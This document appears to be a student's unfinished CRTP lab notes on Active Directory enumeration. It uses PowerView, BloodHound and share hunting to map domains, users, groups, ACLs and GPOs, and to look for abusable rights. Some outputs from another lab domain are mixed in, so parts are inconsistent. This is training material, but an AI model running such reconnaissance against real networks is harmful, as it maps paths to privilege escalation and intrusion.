# Attacker Machine (`studvm`)

## ???

### Domain Enumeration

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
tech\studentuser👤
```

`hostname`:
```
studvm🖥️
```

`ipconfig`:
```
Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::dca5:8ad4:c3fa:8934%4
   IPv4 Address. . . . . . . . . . . : 172.16.100.1🌐
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.100.254
```

`cd C:\AD\Tools`

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

#### Domain Enumeration | Domains, Forests, Trusts (with PowerView)

**Domain Enumeration | Forests**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-Domain`:
```
Forest                  : finance.corp🏰
DomainControllers       : {tech-dc.tech.finance.corp}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : finance.corp
PdcRoleOwner            : tech-dc.tech.finance.corp
RidRoleOwner            : tech-dc.tech.finance.corp
InfrastructureRoleOwner : tech-dc.tech.finance.corp
Name                    : tech.finance.corp🏛️
```

`Get-Forest`:
```
RootDomainSid         : S-1-5-21-1712611810-3596029332-2671080496
Name                  : finance.corp🏰
Sites                 : {Default-First-Site-Name}
Domains               : {finance.corp🏛️, tech.finance.corp🏛️}
GlobalCatalogs        : {finance-dc.finance.corp, tech-dc.tech.finance.corp}
ApplicationPartitions : {DC=ForestDnsZones,DC=finance,DC=corp, DC=DomainDnsZones,DC=tech,DC=finance,DC=corp, DC=DomainDnsZones,DC=finance,DC=corp}
ForestModeLevel       : 7
ForestMode            : Unknown
RootDomain            : finance.corp🏛️
Schema                : CN=Schema,CN=Configuration,DC=finance,DC=corp
SchemaRoleOwner       : finance-dc.finance.corp
NamingRoleOwner       : finance-dc.finance.corp
```

**Domain Enumeration | Domains**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-ForestDomain -Verbose`:
```
Forest                  : finance.corp
DomainControllers       : {finance-dc.finance.corp}🖥️
Children                : {tech.finance.corp}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : finance-dc.finance.corp
RidRoleOwner            : finance-dc.finance.corp
InfrastructureRoleOwner : finance-dc.finance.corp
Name                    : finance.corp🏛️

Forest                  : finance.corp
DomainControllers       : {tech-dc.tech.finance.corp}🖥️
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : finance.corp
PdcRoleOwner            : tech-dc.tech.finance.corp
RidRoleOwner            : tech-dc.tech.finance.corp
InfrastructureRoleOwner : tech-dc.tech.finance.corp
Name                    : tech.finance.corp🏛️
```

**Domain Enumeration | Trusts**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainTrust`:
```
SourceName      : tech.finance.corp🏛️
TargetName      : finance.corp🏛️
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST🔗
TrustDirection  : Bidirectional🔗
WhenCreated     : 2/2/2022 6:53:13 AM
WhenChanged     : 3/11/2025 8:53:24 AM
```

`Get-ForestTrust`:
```
```
❌

| Forest       | Domain              | Parent Domain   | Domain Controllers                | Trusts                              |
|-------------|---------------------|----------------|-----------------------------------|-------------------------------------|
| finance.corp | finance.corp       | -              | finance-dc.finance.corp          | -                                   |
| finance.corp | tech.finance.corp  | finance.corp   | tech-dc.tech.finance.corp        | Bidirectional trust with finance.corp (WITHIN_FOREST) |

#### Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)

**Domain Enumeration | Users**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainUser`:
```
pwdlastset             : 3/16/2022 3:56:32 AM
logoncount             : 52
badpasswordtime        : 3/16/2022 3:39:50 AM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=tech,DC=finance,DC=corp
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 3/11/2025 1:52:58 AM
samaccountname         : Administrator
logonhours             : @{Tuesday=System.Collections.Hashtable; Friday=System.Collections.Hashtable; Wednesday=System.Collections.Hashtable; Saturday=System.Collections.Hashtable;
                         Thursday=System.Collections.Hashtable; Monday=System.Collections.Hashtable; Sunday=System.Collections.Hashtable}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 12/31/1600 4:00:00 PM
countrycode            : 0
whenchanged            : 3/11/2025 8:52:58 AM
instancetype           : 4
usncreated             : 8196
objectguid             : ad9be59e-222e-4d75-8861-bf68e8f13b44
lastlogoff             : 12/31/1600 4:00:00 PM
whencreated            : 2/2/2022 6:53:13 AM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 7:09:30 AM, 2/2/2022 7:09:29 AM, 2/2/2022 6:54:21 AM...}
usnchanged             : 65578
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=tech,DC=finance,DC=corp, CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp,
                         CN=Administrators,CN=Builtin,DC=tech,DC=finance,DC=corp}
lastlogon              : 3/11/2025 1:59:35 AM
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid              : S-1-5-21-1325336202-3661212667-302732393-500
primarygroupid         : 513
iscriticalsystemobject : True
name                   : Administrator

[SNIP]
```

`whoami`:
```
tech\studentuser👤
```

`Get-DomainUser -Name 'studentuser'`:
```
logoncount            : 17
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=student user,CN=Users,DC=tech,DC=finance,DC=corp
objectclass           : {top, person, organizationalPerson, user}
displayname           : student user
lastlogontimestamp    : 3/11/2025 1:59:44 AM
userprincipalname     : studentuser
samaccountname        : studentuser👤
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 3/11/2025 8:59:44 AM
instancetype          : 4
usncreated            : 20893
objectguid            : f0a2b1ef-88bb-4463-8037-6d5f94c5cac3
sn                    : user
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 2/3/2022 3:47:16 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata : {2/4/2022 1:16:34 PM, 2/3/2022 3:47:16 PM, 1/1/1601 12:00:01 AM}
givenname             : student
usnchanged            : 65641
lastlogon             : 3/11/2025 2:10:35 AM
badpwdcount           : 0
cn                    : student user
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-1325336202-3661212667-302732393-1108
primarygroupid        : 513
pwdlastset            : 3/11/2025 1:59:37 AM
name                  : student user
```

`Get-DomainUser | select -ExpandProperty samaccountname`:
```
Administrator👤
Guest👤
krbtgt👤
studentuser👤
techservice👤
databaseagent👤
sqlserversync👤
```

**Domain Enumeration | Computers**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainComputer | select -ExpandProperty samaccountname`:
```
TECH-DC$🖥️
STUDVM$🖥️
MGMTSRV$🖥️
TECHSRV30$🖥️
DBSERVER31$🖥️
```

`Get-DomainComputer | select -ExpandProperty dnshostname`:
```
tech-dc.tech.finance.corp
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`notepad C:\AD\Tools\servers.txt`:
```
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

**Domain Enumeration | Groups**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainGroup | select -ExpandProperty samaccountname`:
```
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
```

`Get-DomainGroupMember -Identity 'RDPUsers'`:
```
```
❌

`Get-DomainGroup -UserName 'studentuser'`:
```
grouptype              : GLOBAL_SCOPE, SECURITY
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Users👥
whenchanged            : 2/2/2022 6:54:20 AM
objectsid              : S-1-5-21-1325336202-3661212667-302732393-513
objectclass            : {top, group}
cn                     : Domain Users
instancetype           : 4
usnchanged             : 12320
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:21 AM, 1/1/1601 12:04:17 AM}
name                   : Domain Users
description            : All domain users
memberof               : CN=Users,CN=Builtin,DC=tech,DC=finance,DC=corp
usncreated             : 12318
whencreated            : 2/2/2022 6:54:20 AM
distinguishedname      : CN=Domain Users,CN=Users,DC=tech,DC=finance,DC=corp
objectguid             : f1cf540d-3d23-47be-889d-d8c1e2a6b01c
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=finance,DC=corp
```

`Get-DomainGroup -Identity 'Domain Admins'`:
```
grouptype              : GLOBAL_SCOPE, SECURITY
admincount             : 1
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Admins👥
whenchanged            : 2/2/2022 7:09:29 AM
objectsid              : S-1-5-21-1325336202-3661212667-302732393-512
name                   : Domain Admins
cn                     : Domain Admins
instancetype           : 4
usnchanged             : 12905
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 7:09:29 AM, 2/2/2022 6:54:21 AM, 1/1/1601 6:12:16 PM}
objectguid             : 737831e2-8781-4176-8b69-81798b10da94
description            : Designated administrators of the domain
memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=tech,DC=finance,DC=corp, CN=Administrators,CN=Builtin,DC=tech,DC=finance,DC=corp}
member                 : CN=Administrator👤,CN=Users,DC=tech,DC=finance,DC=corp
usncreated             : 12315
whencreated            : 2/2/2022 6:54:20 AM
distinguishedname      : CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp
objectclass            : {top, group}
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=finance,DC=corp
```

`Get-DomainGroupMember -Identity 'Domain Admins'`:
```
GroupDomain             : tech.finance.corp
GroupName               : Domain Admins👥
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp
MemberDomain            : tech.finance.corp
MemberName              : Administrator👤
MemberDistinguishedName : CN=Administrator,CN=Users,DC=tech,DC=finance,DC=corp
MemberObjectClass       : user
MemberSID               : S-1-5-21-1325336202-3661212667-302732393-500
```

`Get-DomainGroupMember -Identity 'Enterprise Admins'`:
```
```
❌

`Get-DomainGroupMember -Identity 'Enterprise Admins' -Domain 'finance.corp'`:
```
GroupDomain             : finance.corp
GroupName               : Enterprise Admins👥
GroupDistinguishedName  : CN=Enterprise Admins,CN=Users,DC=finance,DC=corp
MemberDomain            : finance.corp
MemberName              : Administrator👑
MemberDistinguishedName : CN=Administrator,CN=Users,DC=finance,DC=corp
MemberObjectClass       : user
MemberSID               : S-1-5-21-1712611810-3596029332-2671080496-500
```

![BloodHound Legacy | Analysis - Find all Domain Admins](crtp_exam_simulation_bloodhound_find_all_domain_admins.png)

![BloodHound Legacy | Analysis - Find Shortest Paths to Domain Admins](crtp_exam_simulation_bloodhound_find_shortest_paths_domain_admins.png)

![BloodHound Legacy | Analysis - Find Principals with DCSync Rights](crtp_exam_simulation_bloodhound_find_principals_with_dcsync_rights.png)

#### Domain Enumeration | ACLs, OUs, GPOs (with PowerView, BloodHound)

**Domain Enumeration | ACLs**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'studentuser'}`:
```
```
❌

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Domain Admins'}`:
```
```
❌

`Get-PathAcl -Path '\\tech-dc.tech.finance.corp\sysvol'`:
```
Path              : \\tech-dc.tech.finance.corp\sysvol
FileSystemRights  : WriteOwner,WriteDAC,GenericWrite📑,GenericExecute,GenericRead
IdentityReference : Creator Owner
IdentitySID       : S-1-3-0
AccessControlType : Allow

[SNIP]
```

`Get-PathAcl -Path '\\finance-dc.finance.corp\sysvol'`:
```
Path              : \\finance-dc.finance.corp\sysvol
FileSystemRights  : WriteOwner,WriteDAC,GenericWrite📑,GenericExecute,GenericRead
IdentityReference : Creator Owner
IdentitySID       : S-1-3-0
AccessControlType : Allow

[SNIP]
```

???

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'RDPUsers'}`:
```
[SNIP]

ObjectDN                : CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll📑
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1123
IdentityReferenceName   : RDPUsers👥
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : group

[SNIP]
```

`Get-DomainGPO -Identity '{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}'`:
```
flags                    : 0
displayname              : Applocker📑
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 1/6/2025 8:33:19 AM
versionnumber            : 15
name                     : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}
cn                       : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑
usnchanged               : 303528
dscorepropagationdata    : {1/6/2025 8:33:19 AM, 12/18/2024 8:31:49 AM, 12/18/2024 8:31:01 AM, 12/18/2024 8:30:36 AM...}
objectguid               : bcf4770b-b560-468b-88cb-6beaeb6793f9
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}
distinguishedname        : CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 11/15/2022 4:21:20 AM
showinadvancedviewonly   : True
usncreated               : 45231
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

???

**Domain Enumeration | OUs**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainOU`:
```
description            : Default container for domain controllers
systemflags            : -1946157056
iscriticalsystemobject : True
gplink                 : [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=tech,DC=finance,DC=corp;0]
whenchanged            : 2/2/2022 6:53:08 AM
objectclass            : {top, organizationalUnit}
showinadvancedviewonly : False
usnchanged             : 7921
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:20 AM, 1/1/1601 12:04:17 AM}
name                   : Domain Controllers🗂️
distinguishedname      : OU=Domain Controllers,DC=tech,DC=finance,DC=corp
ou                     : Domain Controllers
usncreated             : 7921
whencreated            : 2/2/2022 6:53:08 AM
instancetype           : 4
objectguid             : b12891d1-8645-4d7e-b56b-105f86f17a38
objectcategory         : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=finance,DC=corp
```

`Get-DomainOU | select -ExpandProperty name`:
```
Domain Controllers🗂️
```

???

`Get-DomainObject -SearchBase 'OU=Domain Controllers,DC=tech,DC=finance,DC=corp' -Verbose`:
```
[SNIP]

description            : Default container for domain controllers
systemflags            : -1946157056
iscriticalsystemobject : True
gplink                 : [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=tech,DC=finance,DC=corp;0]
whenchanged            : 2/2/2022 6:53:08 AM
objectclass            : {top, organizationalUnit}
showinadvancedviewonly : False
usnchanged             : 7921
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:20 AM, 1/1/1601 12:04:17 AM}
name                   : Domain Controllers🗂️
distinguishedname      : OU=Domain Controllers,DC=tech,DC=finance,DC=corp
ou                     : Domain Controllers
usncreated             : 7921
whencreated            : 2/2/2022 6:53:08 AM
instancetype           : 4
objectguid             : b12891d1-8645-4d7e-b56b-105f86f17a38
objectcategory         : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=finance,DC=corp

pwdlastset                    : 3/11/2025 1:48:39 AM
logoncount                    : 54
msds-generationid             : {159, 64, 30, 21...}
serverreferencebl             : CN=TECH-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=finance,DC=corp
badpasswordtime               : 12/31/1600 4:00:00 PM
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION📌
distinguishedname             : CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 3/11/2025 1:49:27 AM
samaccountname                : TECH-DC$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 3/11/2025 8:49:27 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2019 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=TECH-DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=tech,DC=finance,DC=corp
objectguid                    : 1afeeb35-bf84-44ff-8c6b-90b52fa90393
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 2/2/2022 6:54:19 AM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata         : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:20 AM, 1/1/1601 12:04:17 AM}
serviceprincipalname📌        : {ldap/tech-dc.tech.finance.corp/DomainDnsZones.tech.finance.corp, ldap/tech-dc.tech.finance.corp/ForestDnsZones.finance.corp,Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/tech-dc.tech.finance.corp, TERMSRV/TECH-DC...}
usncreated                    : 12293
usnchanged                    : 65558
lastlogon                     : 3/11/2025 1:55:07 AM
badpwdcount                   : 0
cn                            : TECH-DC
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-1325336202-3661212667-302732393-1000
primarygroupid                : 516
iscriticalsystemobject        : True
name                          : TECH-DC
ridsetreferences              : CN=RID Set,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
dnshostname                   : tech-dc.tech.finance.corp

ridnextrid                : 1600
usncreated                : 12423
name                      : RID Set
ridpreviousallocationpool : 9015136355904
whenchanged               : 2/8/2022 7:34:07 AM
objectclass               : {top, rIDSet}
cn                        : RID Set
usnchanged                : 38451
dscorepropagationdata     : {2/4/2022 1:16:34 PM, 1/1/1601 12:00:01 AM}
ridallocationpool         : 9015136355904
ridusedpool               : 0
distinguishedname         : CN=RID Set,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
showinadvancedviewonly    : True
whencreated               : 2/2/2022 6:54:29 AM
instancetype              : 4
objectguid                : 179af1dc-255b-4047-8af9-037e6d1beb7d
objectcategory            : CN=RID-Set,CN=Schema,CN=Configuration,DC=finance,DC=corp

usncreated             : 12871
name                   : DFSR-LocalSettings
whenchanged            : 2/2/2022 7:05:01 AM
objectclass            : {top, msDFSR-LocalSettings}
showinadvancedviewonly : True
usnchanged             : 12898
dscorepropagationdata  : {2/4/2022 1:16:34 PM, 2/2/2022 7:00:00 AM, 1/1/1601 12:00:01 AM}
msdfsr-flags           : 48
cn                     : DFSR-LocalSettings
msdfsr-version         : 1.0.0.0
distinguishedname      : CN=DFSR-LocalSettings,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
whencreated            : 2/2/2022 7:00:00 AM
instancetype           : 4
objectguid             : ec8f349d-1d3a-4857-baa9-a26a54c489e6
objectcategory         : CN=ms-DFSR-LocalSettings,CN=Schema,CN=Configuration,DC=finance,DC=corp

usncreated                  : 12874
name                        : Domain System Volume🗂️
msdfsr-memberreference      : CN=TECH-DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=tech,DC=finance,DC=corp
whenchanged                 : 2/2/2022 7:00:00 AM
objectclass                 : {top, msDFSR-Subscriber}
showinadvancedviewonly      : True
usnchanged                  : 12874
dscorepropagationdata       : {2/4/2022 1:16:34 PM, 2/2/2022 7:00:00 AM, 1/1/1601 12:00:01 AM}
cn                          : Domain System Volume
objectcategory              : CN=ms-DFSR-Subscriber,CN=Schema,CN=Configuration,DC=finance,DC=corp
distinguishedname           : CN=Domain System Volume,CN=DFSR-LocalSettings,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
whencreated                 : 2/2/2022 7:00:00 AM
instancetype                : 4
objectguid                  : 1e2e84c2-e6d5-4143-be3f-1bf04595a5fc
msdfsr-replicationgroupguid : {71, 172, 49, 152...}

msdfsr-stagingpath          : C:\Windows\SYSVOL\staging areas\tech.finance.corp
usncreated                  : 12875
msdfsr-options              : 0
name                        : SYSVOL Subscription
whenchanged                 : 2/2/2022 7:05:01 AM
msdfsr-rootpath             : C:\Windows\SYSVOL\domain📌
objectclass                 : {top, msDFSR-Subscription}
msdfsr-readonly             : False
cn                          : SYSVOL Subscription
usnchanged                  : 12899
dscorepropagationdata       : {2/4/2022 1:16:34 PM, 1/1/1601 12:00:01 AM}
objectcategory              : CN=ms-DFSR-Subscription,CN=Schema,CN=Configuration,DC=finance,DC=corp
distinguishedname           : CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=TECH-DC,OU=Domain Controllers,DC=tech,DC=finance,DC=corp
msdfsr-enabled              : True
showinadvancedviewonly      : True
msdfsr-contentsetguid       : {103, 232, 225, 147...}
whencreated                 : 2/2/2022 7:00:00 AM
instancetype                : 4
objectguid                  : da61a328-e550-4cb8-adcc-92ad27b52e82
msdfsr-replicationgroupguid : {71, 172, 49, 152...}

[SNIP]
```

???

**Domain Enumeration | GPOs**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainGPO`:
```
[SNIP]

flags                    : 0
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy📑
gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 2/2/2022 6:53:07 AM
versionnumber            : 1
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}📑
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
usnchanged               : 7792
dscorepropagationdata    : {2/4/2022 1:16:34 PM, 2/2/2022 6:54:21 AM, 1/1/1601 12:00:00 AM}
objectguid               : 45fa190f-e4ce-44ff-af48-9afe0e692569
iscriticalsystemobject   : True
gpcfilesyspath           : \\tech.finance.corp\sysvol\tech.finance.corp\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}📁
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=tech,DC=finance,DC=corp
whencreated              : 2/2/2022 6:53:07 AM
showinadvancedviewonly   : True
usncreated               : 7792
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=finance,DC=corp

[SNIP]
```

`Get-DomainGPO | select -ExpandProperty displayname`:
```
Default Domain Policy📑
Default Domain Controllers Policy📑
```

`Get-DomainGPO -Identity (Get-DomainOU -Identity 'Applocked').gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)`:
```
flags                    : 0
displayname              : Applocker📑
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 1/6/2025 8:33:19 AM
versionnumber            : 15
name                     : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑
cn                       : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}
usnchanged               : 303528
dscorepropagationdata    : {1/6/2025 8:33:19 AM, 12/18/2024 8:31:49 AM, 12/18/2024 8:31:01 AM, 12/18/2024 8:30:36 AM...}
objectguid               : bcf4770b-b560-468b-88cb-6beaeb6793f9
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📁
distinguishedname        : CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 11/15/2022 4:21:20 AM
showinadvancedviewonly   : True
usncreated               : 45231
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

???

`notepad FindInterestingRightsGPODevOps.ps1`:
```powershell
Get-DomainObjectAcl -Identity (Get-DomainOU -Identity 'DevOps').gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72) -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteDACL|GenericAll|WriteOwner" } |
ForEach-Object {
    $sam = ConvertFrom-SID $_.SecurityIdentifier
    [PSCustomObject]@{
        SamAccountName       = $sam
        ActiveDirectoryRights = $_.ActiveDirectoryRights
    }
} | Format-Table SamAccountName, ActiveDirectoryRights
```

`./FindInterestingRightsGPODevOps.ps1`:
```
SamAccountName                                                                                          ActiveDirectoryRights
--------------                                                                                          ---------------------
dcorp\Domain Admins     CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
dcorp\devopsadmin👤     CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl📌, WriteOwner
mcorp\Enterprise Admins CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
dcorp\Domain Admins     CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
Local System            CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
Creator Owner           CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
```

???

![BloodHound Legacy | Node Info: Applocker - Explicit Object Controllers](crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_01.png)

![BloodHound Legacy | Node Info: Applocker - Affected OUs](crtp_exam_simulation_bloodhound_node_info_affected_ous_01.png)

![BloodHound Legacy | Node Info: DevOps Policy - Explicit Object Controllers](crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_02.png)

![BloodHound Legacy | Node Info: DevOps Policy - Affected OUs](crtp_exam_simulation_bloodhound_node_info_affected_ous_02.png)

#### Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter, PowerView)

**Domain Enumeration | Shares**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerHuntShares.psm1`

`type C:\AD\Tools\servers.txt`:
```
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
```
[SNIP]

 ---------------------------------------------------------------
